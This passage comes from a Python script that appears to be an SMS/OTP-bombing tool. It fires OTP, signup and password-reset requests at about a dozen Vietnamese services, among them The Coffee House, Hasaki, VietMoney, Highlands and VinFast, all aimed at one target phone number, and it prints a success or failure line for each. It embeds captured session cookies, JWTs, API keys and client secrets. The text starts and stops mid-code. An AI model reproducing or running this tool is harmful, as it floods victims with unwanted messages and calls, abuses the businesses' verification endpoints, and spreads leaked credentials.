PrestaShop-03bfe1c20f5691800e1f882876466fe7=def50200a1276f3d7b88be6bf9b7363cc6a59f6ba6b1453cb3b46c0633940c04a97756272df36d87542e8a27e57038d4b7936ffed9c1e753d9ee9a30effd837ab2846cf4d3a67fd12c07b04e5aa5c8aaf0be9f8aeecf4c685c42eb85987277010284ddcad86163c8ee6cb7ff98c89909d3de555a7f7fdc5bdbdd9c31bd8882e2dcb962799979fdab88a49b719d3cdaef4617f0c7c735099ae76dd72c8afaa66ce54698d12810f5d9cae8add5a54fc79cab7aaa016f23fb78ac404c03a9ce81a78abaa2cf793ff38929e312c6182028b27dc77105c3c0d5022c5ba4674d25b3a11982034a8080d39601ad371dd8ec95fab4e776f1688c25428aee70f107ce7693a30156b6993e7a777e528a68c86c822cc375ccfa629cf58990ed',
        'origin': 'https://www.kkfashion.vn',
        'priority': 'u=0, i',
        'referer': 'https://www.kkfashion.vn/dang-nhap?create_account=1',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    params = {
        'create_account': '1',
    }
    random_email = generate_random_email()
    data = {
        'username': 'tran dat',
        'phone': sdt,
        'email': random_email,
        'password': '123123aA@',
        'city': 'Thành phố Cần Thơ',
        'district': 'Huyện Cờ Đỏ',
        'ward': 'Thới Xuân',
        'address2': 'Thới Xuân - Huyện Cờ Đỏ',
        'address1': '22 tan te3 ',
        'submitCreate': '1',
    }

    response = requests.post('https://www.kkfashion.vn/dang-nhap', params=params, cookies=cookies, headers=headers, data=data)

    cookies = {
        '_qg_fts': '1721578581',
        'QGUserId': '1896938940101377',
        '_qg_pushrequest': 'true',
        '_qg_cm': '1',
        'PHPSESSID': 'd6e6f38ea2j2tf3m264h26599v',
        'jpresta_cache_source_6666cd76f96956469e7be39d750cc7d9': '2',
        'PrestaShop-7cbf831598fa6791cd6d07d5b5873d26': 'def5020068bc9968a1f8eaaf0c1d13a95cc8f785bc1e80ef97d2381149d44416b718ea0e1ec703548d1e2c36c17c2fc7bb621176cc5144ba9afbd8e52ab34e62676287139a492a5fb1df85974c1d817955c9dbd66fb0048b6d55396eb82141cd0082257db6f741e461e897ac3bab90f3da71886e4b0a4c48699290185853153f52531995e21cea01e5f336ee0b4f2be6b6eb24eab82935a13898ef71d00e23f59018d4a57353e0ed77c1d620ca46aa302c8dee2b3b4befd342b1db81d32f88c89cc27c55af97e559e6c67e0fc37871bb29cdedb3f218d114857262c878fb3cc1d18c81bb76981cbbc5b2c4f9598485b794288ecc2a4c5f7ad27f78838b5b898f137721fef9c7625ee410bd91cbe2ae87d3a0e2700c5bff120321beec50628206',
        'jpresta_cache_context': 'e67fa49f-162d-11ee-9cf4-0692000019e5',
        'PrestaShop-03bfe1c20f5691800e1f882876466fe7': 'def502004244d73ba44dfc4e9f94dfa641d33aa71985561b821acd2d8a87e724e19921f344cb9602cba1c49d99a5e60c05d71d9022fe3ecb2c8832b6bf3deb69101ae3e8872ff32d28a90f0687bd88bd84ca74216d1e312c2a43f84130230fff88fcc2289870ac6445e93d49ce1bb2bc14b780a65adfea4923c5e9e5a8eb4fde527ca1692bb6e01c850b86614cddd69e138438283f8230e315366ede432762e712bf75a18fd0c078028c11dbeeb8e0813a23608919ec47e413cdc60d0da1cea2cd3f327402ce72e7db4fb60d77d2f7096b6fb0b4bdfc015e4d374f3b143d11c5c5d15b17093c695393ccf24bc6122ec7e960e25b94187f73735c06eb0b71e16d333dd26ea6f24904b4a46e4558359cd94743',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_qg_fts=1721578581; QGUserId=1896938940101377; _qg_pushrequest=true; _qg_cm=1; PHPSESSID=d6e6f38ea2j2tf3m264h26599v; jpresta_cache_source_6666cd76f96956469e7be39d750cc7d9=2; PrestaShop-7cbf831598fa6791cd6d07d5b5873d26=def5020068bc9968a1f8eaaf0c1d13a95cc8f785bc1e80ef97d2381149d44416b718ea0e1ec703548d1e2c36c17c2fc7bb621176cc5144ba9afbd8e52ab34e62676287139a492a5fb1df85974c1d817955c9dbd66fb0048b6d55396eb82141cd0082257db6f741e461e897ac3bab90f3da71886e4b0a4c48699290185853153f52531995e21cea01e5f336ee0b4f2be6b6eb24eab82935a13898ef71d00e23f59018d4a57353e0ed77c1d620ca46aa302c8dee2b3b4befd342b1db81d32f88c89cc27c55af97e559e6c67e0fc37871bb29cdedb3f218d114857262c878fb3cc1d18c81bb76981cbbc5b2c4f9598485b794288ecc2a4c5f7ad27f78838b5b898f137721fef9c7625ee410bd91cbe2ae87d3a0e2700c5bff120321beec50628206; jpresta_cache_context=e67fa49f-162d-11ee-9cf4-0692000019e5; PrestaShop-03bfe1c20f5691800e1f882876466fe7=def502004244d73ba44dfc4e9f94dfa641d33aa71985561b821acd2d8a87e724e19921f344cb9602cba1c49d99a5e60c05d71d9022fe3ecb2c8832b6bf3deb69101ae3e8872ff32d28a90f0687bd88bd84ca74216d1e312c2a43f84130230fff88fcc2289870ac6445e93d49ce1bb2bc14b780a65adfea4923c5e9e5a8eb4fde527ca1692bb6e01c850b86614cddd69e138438283f8230e315366ede432762e712bf75a18fd0c078028c11dbeeb8e0813a23608919ec47e413cdc60d0da1cea2cd3f327402ce72e7db4fb60d77d2f7096b6fb0b4bdfc015e4d374f3b143d11c5c5d15b17093c695393ccf24bc6122ec7e960e25b94187f73735c06eb0b71e16d333dd26ea6f24904b4a46e4558359cd94743',
        'origin': 'https://www.kkfashion.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.kkfashion.vn/khoi-phuc-mat-khau',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
        'otpcode': '',
    }

    try:
        response = requests.post('https://www.kkfashion.vn/module/nj_sms/forgotPassword', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("KKFASHION | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("KKFASHION | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def thecoffeehouse():
    cookies = {
        '_fbp': 'fb.1.1735445416958.421812788735503682',
        '_ga': 'GA1.1.1468517502.1735445416',
        '_ga_8WYX50CXX1': 'GS1.1.1735445416.1.0.1735445416.60.0.0',
        '_gat': '1',
        '_gat_gtag_UA_74991073_10': '1',
        '_gid': 'GA1.2.422886087.1735445416',
    }

    headers = {
        'Host': 'api.thecoffeehouse.com',
        'Accept': 'application/json',
        'TCH-DEVICE-ID': '07656846-4793-4232-8209-B756630A7277',
        'Accept-Language': 'vi',
        'Content-Type': 'application/json; charset=utf-8',
        'User-Agent': '(iPhone7; iOS 15.8.2)',
        'TCH-APP-VERSION': '5.9.31',
        # 'Cookie': '_fbp=fb.1.1735445416958.421812788735503682; _ga=GA1.1.1468517502.1735445416; _ga_8WYX50CXX1=GS1.1.1735445416.1.0.1735445416.60.0.0; _gat=1; _gat_gtag_UA_74991073_10=1; _gid=GA1.2.422886087.1735445416',
        'TCH-APP-DEVICE-CHECK': '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',
    }

    json_data = {
        'phone': {
            'phone_number': sdt,
            'region_code': '+84',
        },
    }

    try:
        response = requests.post('https://api.thecoffeehouse.com/api/v5/auth/request-otp', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("THECOFFEEHOUSE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("THECOFFEEHOUSE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def hasaki():
    cookies = {
        'HASAKI_SESSID': '900e892e3fe58b9cb88bfe7fe64966b5',
        'form_key': '900e892e3fe58b9cb88bfe7fe64966b5',
        'sessionChecked': '1733543841',
    }

    headers = {
        'Host': 'api.hasaki.vn',
        # 'Cookie': 'HASAKI_SESSID=900e892e3fe58b9cb88bfe7fe64966b5; form_key=900e892e3fe58b9cb88bfe7fe64966b5; sessionChecked=1733543841',
        'content-type': 'application/json; charset=utf-8',
        'mobileappversion': '2.3.87',
        'mobileregion': 'VN',
        'accept': 'application/json',
        'mobileosversion': '15.8.2',
        'accept-language': 'vi-VN,vi;q=0.9',
        'mobilecartid': '0',
        'mobiledeviceid': '597F2031-B49F-4701-8A48-A94D58BA5DDB',
        'user-agent': 'Hasaki.vn/1 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'mobileplatform': 'ios',
    }

    params = {
        'username': sdt,
    }

    try:
        response = requests.get('https://api.hasaki.vn/mobile/v3/user/get-code-verify', params=params, cookies=cookies, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HASAKI | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HASAKI | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vietmoney():
    headers = {
        'Host': 'gateway.vietmoney.vn',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'user-agent': 'VietMoney/166 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    json_data = {
        'phone': sdt,
        'otpMethod': 'sms',
    }

    try:
        response = requests.post('https://gateway.vietmoney.vn/digital-svc/v1/auth/signup', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VIETMONEY | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIETMONEY | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vietmoneycall(): # 429
    headers = {
        'Host': 'gateway.vietmoney.vn',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'user-agent': 'VietMoney/166 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    json_data = {
        'phone': sdt,
        'otpMethod': 'call',
    }


    try:
        response = requests.post('https://gateway.vietmoney.vn/digital-svc/v1/auth/signup', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VIETMONEYCALL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIETMONEYCALL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vinschool(): #ap
    headers = {
        'Host': 'one-api.vinschool.edu.vn',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'cache-control': 'no-store',
        'user-agent': 'Vinschool/3 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    json_data = {
        'phone_number': sdt,
        'unique_id': '274889DD-7051-4F23-9A28-F54E73F77A9A',
    }

    try:
        response = requests.post(
            'https://one-api.vinschool.edu.vn/api/master-data/v2/account/login/send-otp',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VINSCHOOL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VINSCHOOL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def homeid(): #ap
    headers = {
        'Host': 'www.googleapis.com',
        'x-client-version': 'iOS/FirebaseSDK/7.3.0/FirebaseCore-iOS',
        'content-type': 'application/json',
        'accept': '*/*',
        'x-ios-bundle-identifier': 'asia.homeid',
        'user-agent': 'FirebaseAuth.iOS/7.3.0 asia.homeid/1.1.6 iPhone/15.8.2 hw/iPhone9_3',
        'accept-language': 'vi',
    }

    params = {
        'key': 'AIzaSyBMwQDLKUqLZskG_4QBWSU79RUCYeXclwQ',
    }

    json_data = {
        'iosReceipt': 'AEFDNu_9qDiFRHvwruvGQjzmiO9YoKu03VGru0yCGiM6oKh6PfOTvTNPb5S2uv2EPQeHYSj_aMc9G71N3IMexyRojZqWz5g2z9rTFplJn__93x-tJkJge7g',
        'iosSecret': '1UHmX596jgq1PjGV',
        'phoneNumber': sdt_chuyen_doi,
    }

    try:
        response = requests.post(
            'https://www.googleapis.com/identitytoolkit/v3/relyingparty/sendVerificationCode',
            params=params,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HOMEID | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HOMEID | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def highlands(): #ap 
    cookies = {
        '.diadiem.Session': 'CfDJ8PoFpWVp%2FpdMhR9HbDRDTjvQ3P9oiWq7sLAZDIAEIJQkq1BCCexcaXOOw8h2osc2O%2B%2BbBmX%2F9TgsuKk35ZhirG%2B%2BZ0OyTD6CoQLnnRPN3I%2BtfIDD%2BJr70J8%2F9XnoUu0%2B%2BkcY2YLmrP0lKTsNgRvIhNFewRV0rfR7gdO7zje9PxnU',
        'route': '1734771032.298.37.687218|d5b38695e274be05122762aeb7f81e07',
    }

    headers = {
        'Host': 'api-app.highlandscoffee.com.vn',
        # 'Cookie': '.diadiem.Session=CfDJ8PoFpWVp%2FpdMhR9HbDRDTjvQ3P9oiWq7sLAZDIAEIJQkq1BCCexcaXOOw8h2osc2O%2B%2BbBmX%2F9TgsuKk35ZhirG%2B%2BZ0OyTD6CoQLnnRPN3I%2BtfIDD%2BJr70J8%2F9XnoUu0%2B%2BkcY2YLmrP0lKTsNgRvIhNFewRV0rfR7gdO7zje9PxnU; route=1734771032.298.37.687218|d5b38695e274be05122762aeb7f81e07',
        'content-type': 'application/json',
        'accept': 'application/json',
        'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjBhYmUxZmFlLWI4YzUtNDhmYy1iYzhjLTVlOTA5ODNjY2VmNyJ9.eyJVc2VyR3VpZCI6IkN1c3RvbWVyLzIiLCJEZXZpY2VHdWlkIjoiRGV2aWNlLzQiLCJMb2NhdGlvbkd1aWQiOiJMb2NhdGlvbi80IiwiS2V5RGV2aWNlIjoiRTJWQy1KTUwzLTRXWFEiLCJEZXZpY2VUeXBlIjoiMSIsIm5iZiI6MTczNDc3MTAyMCwiZXhwIjoxNzM3OTY3ODIwLCJpYXQiOjE3MzQ3NzEwMjAsImlzcyI6Imh0dHBzOi8vYXBpLWFwcC5oaWdobGFuZHNjb2ZmZWUuY29tLnZuIiwiYXVkIjoiaHR0cHM6Ly9hcGktYXBwLmhpZ2hsYW5kc2NvZmZlZS5jb20udm4ifQ.s1f5aqFBATZGDqgA69uFYle-UsEH_4mqdb8-3euaRXk',
        'x-auth-checksum': '14129e5f51e48ae7ff9d12116c80e1d33bf2c56e355412683ca33c17732e6012',
        'x-auth-timestamp': '1734771031306',
        'accept-language': 'vi',
        'x-auth-signature': 'b75377e9453f0644fce99ba40305dd1cf3371438cd03f36e92c4da19f3ca7493',
        'user-agent': 'PendoGO/4.1.15 (com.vti.highlands; build:1; iOS 15.8.2) Alamofire/5.9.1',
        'x-auth-nonce': '1734771031306155',
        'x-auth-devicecode': 'E2VC-JML3-4WXQ',
    }

    json_data = {
        'UserAccount': sdt_chuyen_doi,
    }

    try:
        response = requests.post(
            'https://api-app.highlandscoffee.com.vn/api/v3/authentication/otp/send',
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HIGHLANDS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HIGHLANDS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def meeyland(): #ap
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN',
        'content-type': 'application/json',
        'origin': 'https://meeyland.com',
        'priority': 'u=1, i',
        'referer': 'https://meeyland.com/',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'x-affilate-id': 'undefined',
        'x-browser-id': 'undefined',
        'x-client-id': 'meeyland',
        'x-partner-id': '',
        'x-time': '1737255198154',
        'x-token': 'MTczGlBxoNzI1NTE5ODE1NgPI3uC5HaVp1U092emh0THhYYnZPWnZWRmxGRp7FRxlBSdGlYaG53Y3F6Y3LvcUuFaTVBxTU5XZUNVdXlyaFRsrPLNaGAGA3Dts3pRFVDRlFoY2VtZFRTcVNoLjgxMmMyYjY2NTNjNTljMWEwOWZmZmExYTFkYzAyN2Iy',
    }

    json_data = {
        'target': sdt,
        'type': 'phone',
        'refCode': '',
    }

    try:
        response = requests.post('https://v3.meeyid.com/auth/v4.3/login', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MEEYLAND | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MEEYLAND | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vinfastescooter(): #ap
    headers = {
        'Host': 'escooter-api.vinfast.vn',
        'content-type': 'application/json',
        'accept': 'application/json',
        'app_version': '2.25.0',
        'accept-language': 'vi-VN',
        'platform': 'Ios',
        'player_id': '8e6a098f-aeac-4c62-94a2-fd361c2a5f74',
        'user-agent': 'eScooter/2024.1213.1812 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'client_id': 'IOS00000009GNY9TB9YXKKY809QRK5SH',
        'device_id': '59A17FFC-EABF-42F6-B692-E2FC7CC39CEC',
        'os_version': 'ios15.8.2',
        'client_secret': 'IOS00009GNY9TB9YXKKY809QRK5SH9012345678901234567890123456789654',
        'device_model': 'Iphone 4.7"',
    }

    json_data = {
        'type': 'REGISTRATION',
        'mobile_number': sdt,
    }

    try:
        response = requests.post(
            'https://escooter-api.vinfast.vn/api-gateway/otp-management/v1.0/otp/generate',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VINFAST E-SCOOTER | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VINFAST E-SCOOTER | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def taskal(): #ap vinchat
    cookies = {
        'tio_session': '1887448383557107712',
    }

    headers = {
        'Host': 'tchat.telesafe.me',
        # 'Cookie': 'tio_session=1887448383557107712',
        'content-type': 'application/json; charset=UTF-8',
        'tio-bundleid': 'vinchat',
        'accept': '*/*',
        'tio-appversion': '1.1.8',
        'tio-deviceinfo': 'iPhone XR',
        'tio-cid': '59',
        'tio-resolution': '828,1792',
        'accept-language': 'vi-VN;q=1',
        'tio-imei': '6c452635e6b0465a9c91eb7c0c579d09',
        'tio-size': 'iPhone11,8',
        'user-agent': 'VinTalk/1.1.8 (iPhone; iOS 17.4.1; Scale/2.00)',
        'tio-operator': 'Viettel',
        'tio-idfa': '00000000-0000-0000-0000-000000000000',
    }

    data = {
        'country': '+84',
        'deviceId': '6c452635e6b0465a9c91eb7c0c579d09',
        'p_is_ios': '1',
        'phone': sdt[1:10],
    }

    try:
        response = requests.post('https://tchat.telesafe.me/mytio/extotp/request.tio_x', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TASKAL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TASKAL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def star_t(): #ap
    headers = {
        'Host': 'www.googleapis.com',
        'x-client-version': 'iOS/FirebaseSDK/6.9.2/FirebaseCore-iOS',
        'content-type': 'application/json',
        'accept': '*/*',
        'x-ios-bundle-identifier': 'com.ywmobile.rocket.star',
        'user-agent': 'FirebaseAuth.iOS/6.9.2 com.ywmobile.rocket.star/2.0.24 iPhone/15.8.2 hw/iPhone9_3',
        'accept-language': 'vi',
    }

    params = {
        'key': 'AIzaSyA0EhB-nkhZxd6mkVCXg-jIwWdIcotqL8g',
    }

    json_data = {
        'iosReceipt': 'AEFDNu_6rjcr3q-KWR56_JNNvcF72llii9GifB96ncXsPIpMf1BGoW-ylljFYYGlclZ5JdvBB54WDyKA6pLJMiUKj54fePMPam87XuG2j1mKIHefOuS06OZkP2xnC_57cx_tK88',
        'iosSecret': 'FPPFuD-2vXQRJWZL',
        'phoneNumber': sdt_chuyen_doi,
    }

    try:
        response = requests.post(
            'https://www.googleapis.com/identitytoolkit/v3/relyingparty/sendVerificationCode',
            params=params,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("STAR-T | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("STAR-T | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def nhadatvui():
    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6IjRtck1EbDlmVVgwMUR6dWRBWWdLclE9PSIsInZhbHVlIjoibE1NUnk4LzBEcnpQWEJxemc1Ujgyb0paV0F1bWRMNGQreTMwU2U0WWxNb1hPNDluaUJXcTlFSk51TzhFcENZVzlCSEgrbFdkK01Ra2FOVndHemthZVlyY2ZUMUpoTzZ2ajNob05penI4WDhlU2NOZjZOM0F2b1Rpdk1IeitEcisiLCJtYWMiOiJhN2MyMTFjOGI5ZTFkZTZkMmFlNDQ2YWU3NzkxNTEyNzc5YjNiNjY5OWMyNDkzNDM1Y2QxNTliOWMzZWFkNGIyIiwidGFnIjoiIn0%3D',
        'nhadatvui_session': 'eyJpdiI6IjhKdU53dkJEN0ExU2g2ajhZTUU1RWc9PSIsInZhbHVlIjoiZ2xlMUtIVklZVG4wbmI5MFFJRXJ6NVlGWjkrczQ3cjdUUU5CYlFUSmoyVjIya1VsNnplaUZPREkvaklDT1c4YXBoUTljRFF0OUNlTHBqTWVnejMvdmI1SkdUY2hEeUVMY29qNlJDSnlFMjdPNXFsaWt2ZUt1WkJtYTdNMmhJUGciLCJtYWMiOiI1MDBmYzhlNDJiNGQ4MzBlNGZlM2NhZmVlZTRhY2Q4Y2RkMTQ1OTVlY2YzZjkwYjEwMmJiZjk0YjI2ZGY5MzkxIiwidGFnIjoiIn0%3D',
    }

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
